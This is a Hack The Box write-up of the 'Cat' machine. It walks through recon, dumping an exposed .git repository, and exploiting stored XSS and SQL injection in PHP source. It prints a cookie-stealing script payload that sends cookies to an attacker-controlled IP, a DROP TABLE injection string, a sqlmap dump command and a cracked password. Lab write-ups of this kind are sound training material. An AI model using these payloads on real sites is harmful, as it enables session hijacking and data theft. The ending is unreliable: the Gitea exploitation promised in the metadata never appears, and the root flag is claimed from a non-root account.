---
title: Cat - Hack The Box Writeup
date: 2025-02-11
categories: [CTF, Writeups, HTB]
tags: [htb, linux, rce, lfi, stored-xss, privilege-escalation, gitea]
image:
  path: https://blog.n0va.in/assets/images/htb-cat.jpg

  description: A detailed walkthrough of the Cat HTB machine, showcasing exploitation of stored XSS, SQL injection, and Gitea vulnerabilities.
author: issue403
---

## Nmap Recon and Initial Enumeration

To begin our reconnaissance, we run an Nmap scan to identify open ports and services on the target machine:

```bash
nmap -sV 10.10.11.53 -T5 -Pn
```

The scan results reveal that Port 22 (SSH) and Port 80 (HTTP) are open.

Next, we attempt to access the website by entering the machine’s IP address in a browser. Instead of a standard page, we notice that the hostname `cat.htb` is referenced. To resolve this domain locally, we add it to our `/etc/hosts` file:

```bash
echo "10.10.11.53 cat.htb" | sudo tee -a /etc/hosts
```

With this update, we can now access `cat.htb` in our browser to further explore potential attack vectors.

## Exploring the Application

Before diving deeper, let’s explore the application to get an overall idea.

The website appears to be a community page for cat lovers, featuring a voting system. On further inspection, we find a voting section:

![Voting Section](https://blog.n0va.in/assets/images/Pasted%20image%2020250203031230.png)

However, voting is currently closed. This suggests that additional functionalities might be accessible after logging in.

### Checking Cookies

Even before logging in, we notice that the application assigns cookies to our session:

```bash
Cookie: session=xyz123
```

### Logging In

After logging in, we gain access to more features, including the ability to participate in contests. Interestingly, there is also a file upload option, which could potentially lead to Remote Code Execution (RCE)—something worth investigating further.

## Subdomain & Directory Enumeration

Meanwhile, we check for subdomains but find nothing significant. Next, we perform directory enumeration using `dirsearch` with a default wordlist:

```bash
dirsearch -u http://cat.htb/
```

During enumeration, we discover a `.git` directory:

```bash
[200] GET /.git/
```

### Extracting .git Repository

To leverage this, we use a tool called `git-dumper`, which helps automate the extraction of `.git` repositories. This tool checks if directory listing is enabled and recursively downloads the `.git` contents for further analysis:

```bash
git-dumper http://cat.htb/.git ./cat_source
```

### Reviewing Extracted Source Code

After extracting the `.git` directory, we now have access to a large portion of the source code. This provides us with a deeper understanding of the application’s structure and potential vulnerabilities.

## Identifying Vulnerabilities

### 1. Stored XSS in Registration (`join.php`)

Upon reviewing `join.php`, we notice an unsanitized user input being directly stored in the database during registration:

```php
// Vulnerable registration code
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];  //  Unsanitized input
    $email = $_GET['email'];        //  Unsanitized input

    $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
    $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);
}
```

Here, the `username` and `email` fields are not sanitized or validated before being stored in the database. This allows an attacker to inject Stored XSS payloads.

**Example Attack:**

An attacker could register with the following username:

```bash
<script>alert(document.cookie)</script>
```

Since the input is stored in the database without sanitization, whenever this username is displayed, the malicious script executes, potentially stealing cookies from other users.

### 2. SQL Injection in `accept_cat.php`

Analyzing `accept_cat.php`, we find another major vulnerability: SQL Injection due to direct user input in SQL queries.

```php
// VULNERABLE CODE:
$cat_name = $_POST['catName'];
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
$pdo->exec($sql_insert);
```

Here’s why this is dangerous:

1. `$cat_name` is not sanitized before being used in the SQL query.
2. String concatenation is used, making it prone to SQL injection attacks.
3. `exec()` is used instead of prepared statements, leaving the application exposed.

**Example Attack:**

An attacker could send a POST request with:

```bash
catName = '); DROP TABLE accepted_cats; --
```

This would result in the following SQL query execution:

```sql
INSERT INTO accepted_cats (name) VALUES (''); DROP TABLE accepted_cats; --')
```

If executed, this would delete the entire `accepted_cats` table, causing major data loss.

## Exploitation

### Stealing Admin Cookies via Stored XSS

From our earlier findings, we know that the admin (Axel) reviews contest submissions. When he does, the malicious username is displayed, and the payload is executed.

Payload:

```html
<script>document.location='http://10.10.14.17:1111/?c='+document.cookie;</script>
```

Start a web server to capture the cookie:

```bash
python3 -m http.server 1111
```

Once Axel reviews the submission, his cookie is sent to our server:

```bash
GET /?c=admin-session-cookie HTTP/1.1
```

Using the admin cookie, we access the admin panel and exploit the SQL injection in `accept_cat.php` to dump the database.

### Database Dump with SQLmap

Copy the vulnerable request and save it in a file, then run SQLmap:

```bash
sqlmap -r request.txt --dump
```

From the database dump, we retrieve password hashes for multiple users. Cracking the hashes reveals valid credentials for `rosa`:

```bash
rosa:soyunaprincesarosa
```

### Privilege Escalation

While exploring the machine as `rosa`, we check the Apache logs and discover Axel’s SSH credentials:

```bash
cat /var/log/apache2/access.log
```

Using these credentials, we log in as `axel` and retrieve the root flag.

---

This concludes the walkthrough for the Cat HTB machine. We exploited stored XSS, SQL injection, and misconfigured Git repositories to gain full access to the machine. Happy hacking!

